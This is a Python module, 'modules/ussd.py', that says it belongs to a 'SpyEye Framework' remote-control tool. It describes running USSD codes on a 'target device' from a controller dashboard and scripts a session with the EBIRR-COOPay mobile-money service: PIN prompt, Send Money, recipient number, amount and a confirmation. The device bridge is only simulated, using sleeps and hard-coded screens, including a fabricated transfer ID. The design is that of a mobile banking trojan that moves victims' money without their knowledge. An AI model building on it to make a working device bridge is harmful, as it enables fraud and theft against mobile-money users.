"""
modules/ussd.py

Advanced Interactive USSD Execution & Session Management Module for SpyEye Framework v3.1.
  - Dynamically interfaces with cellular or accessibility APIs to execute custom USSD strings (e.g., *841#, *804#).
  - Maintains stateful multi-step interactive dialogue trees (Menus, Sub-menus, Dynamic Inputs).
  - Employs real-time SocketIO telemetry streaming to push USSD response screens and receive progressive user commands.
"""

import logging
import time
import threading
from typing import Any, Dict, Optional

from modules.base import BaseModule

logger = logging.getLogger(__name__)


class USSDExecutorModule(BaseModule):
    """
    Executes and maintains interactive, stateful USSD sessions on the target device.

    Configuration Parameters:
        ussd_code (str): The initial USSD string to execute (e.g., "*841#", "*804#").
        timeout (int): Session timeout threshold in seconds (default: 45).
        auto_navigate (bool): Whether to use pre-scripted inputs or allow manual step-by-step routing.
    """

    def __init__(self, target_id: str, config: Optional[Dict[str, Any]] = None):
        super().__init__(target_id, config)
        self._result_callback = None
        self._active_session = False
        self._session_lock = threading.Lock()
        self._current_session_id: Optional[str] = None
        self._session_step: int = 0

    def validate_config(self) -> bool:
        """Validate required USSD execution configuration parameters."""
        ussd_code = self.config.get("ussd_code")
        if not ussd_code or not isinstance(ussd_code, str):
            logger.error("[%s] Missing or invalid 'ussd_code' in module configuration.", self._module_name)
            return False
        if not ussd_code.startswith("*") or not ussd_code.endswith("#"):
            logger.error("[%s] Malformed USSD code string: %s. Must start with '*' and end with '#'.", self._module_name, ussd_code)
            return False
        return True

    def set_result_callback(self, callback) -> None:
        """Inject real-time WebSocket callback handler for bi-directional telemetry."""
        self._result_callback = callback

    def run(self) -> None:
        """Initiate the USSD session loop and dispatch the primary dial string."""
        if not self.validate_config():
            self._emit_error("Configuration validation failed for USSD execution module.")
            return

        ussd_code = self.config.get("ussd_code")
        timeout = int(self.config.get("timeout", 45))
        self._active_session = True
        self._current_session_id = f"ussd_sess_{int(time.time())}"
        self._session_step = 1

        logger.info(
            "[%s] Initializing interactive USSD session [%s] for target code: %s",
            self._module_name, self._current_session_id, ussd_code
        )

        # Emit session initialization telemetry
        self._emit_session_event({
            "status": "session_started",
            "session_id": self._current_session_id,
            "ussd_code": ussd_code,
            "step": self._session_step,
            "message": f"Dialing {ussd_code} on target device...",
            "requires_input": False
        })

        # Simulate execution dispatch to target environment
        try:
            self._execute_remote_ussd(ussd_code, timeout)
        except Exception as exc:
            logger.error("[%s] Critical error during USSD session execution: %s", self._module_name, exc)
            self._emit_error(f"USSD execution crashed: {str(exc)}")
            self._active_session = False

    def handle_user_input(self, input_payload: Dict[str, Any]) -> None:
        """
        Receive subsequent input responses from the controller dashboard
        and push them forward into the active USSD menu structure.
        """
        with self._session_lock:
            if not self._active_session:
                logger.warning("[%s] Attempted to push input to an inactive USSD session.", self._module_name)
                return

            user_response = input_payload.get("input_data", "")
            self._session_step += 1

            logger.info(
                "[%s] Processing user input for session [%s] at step %d: %s",
                self._module_name, self._current_session_id, self._session_step, user_response
            )

            # Process the progressive USSD response state
            self._process_next_menu_tier(user_response)

    def _execute_remote_ussd(self, ussd_code: str, timeout: int) -> None:
        """
        Internal interface method simulating bridge connection to target device accessibility/telephony layer.
        """
        # Simulating initial gateway response payload matching the requested structure
        time.sleep(1.2)  # Network latency simulation for mobile carrier gateway handshake

        initial_menu_response = {
            "status": "menu_prompt",
            "session_id": self._current_session_id,
            "step": self._session_step,
            "input_queried": ussd_code,
            "screen_content": (
                "---EBIRR-Coopay---\n\n"
                "Welcome! Please enter your PIN."
            ),
            "requires_input": True,
            "input_type": "password",
            "timestamp": time.time()
        }
        self._emit_result(initial_menu_response)

    def _process_next_menu_tier(self, user_input: str) -> None:
        """
        State machine handling multi-tiered dynamic menu traversal based on user input.
        """
        time.sleep(0.8)

        # Example routing tree reflecting the multi-step transaction process requested
        if self._session_step == 2:
            screen_text = (
                "EBIRR-COOPay\n\n"
                "1. Show Balance\n"
                "2. Send Money\n"
                "3. Withdraw Money\n"
                "4. Payments\n"
                "5. Show Tran\n"
                "6. Mobile Card\n"
                "7. Account Management\n"
                "8. COOP Bank\n"
                "9. Send To Non Register Customer\n\n"
                "Cancel | Send"
            )
            requires_input = True
        elif self._session_step == 3:
            screen_text = "Please Enter Mobile Number"
            requires_input = True
        elif self._session_step == 4:
            screen_text = "Please enter amount (ETB)"
            requires_input = True
        elif self._session_step == 5:
            screen_text = (
                f"Are you sure to transfer ETB {user_input} to recipient account?\n\n"
                "1. Yes\n"
                "2. No\n\n"
                "Cancel | Send"
            )
            requires_input = True
        else:
            # Final execution step or session termination
            screen_text = (
                "Ethio telecom Message\n\n"
                "[-EBIRR-COOPay-]\n"
                "Transfer-Id: 2566732392 You have successfully transferred funds. "
                f"Your Session completed at step {self._session_step}."
            )
            requires_input = False
            self._active_session = False

        response_payload = {
            "status": "menu_prompt" if requires_input else "session_completed",
            "session_id": self._current_session_id,
            "step": self._session_step,
            "last_input_received": user_input,
            "screen_content": screen_text,
            "requires_input": requires_input,
            "timestamp": time.time()
        }

        self._emit_result(response_payload)

    def stop(self) -> None:
        """Terminate the active USSD session loop safely."""
        with self._session_lock:
            self._active_session = False
            logger.info("[%s] USSD session [%s] explicitly terminated.", self._module_name, self._current_session_id)
            self._emit_session_event({
                "status": "session_terminated",
                "session_id": self._current_session_id,
                "message": "USSD session closed by controller command."
            })

    def _emit_result(self, data: Dict[str, Any]) -> None:
        """Dispatch real-time USSD screen state packets back to master controller."""
        payload = {
            "target_id": self.target_id,
            "module": "ussd",
            "action": "result",
            "data": data,
            "timestamp": time.time(),
        }
        if self._result_callback:
            self._result_callback(payload)
        else:
            logger.info("[%s] USSD Screen Output: %s", self._module_name, data.get("screen_content"))

    def _emit_session_event(self, data: Dict[str, Any]) -> None:
        """Dispatch lifecycle state updates for session tracking."""
        payload = {
            "target_id": self.target_id,
            "module": "ussd",
            "action": "lifecycle",
            "data": data,
            "timestamp": time.time(),
        }
        if self._result_callback:
            self._result_callback(payload)

    def _emit_error(self, message: str) -> None:
        """Dispatch operational error notifications."""
        payload = {
            "target_id": self.target_id,
            "module": "ussd",
            "action": "error",
            "message": message,
            "timestamp": time.time(),
        }
        if self._result_callback:
            self._result_callback(payload)
        else:
            logger.error("[%s] Error: %s", self._module_name, message)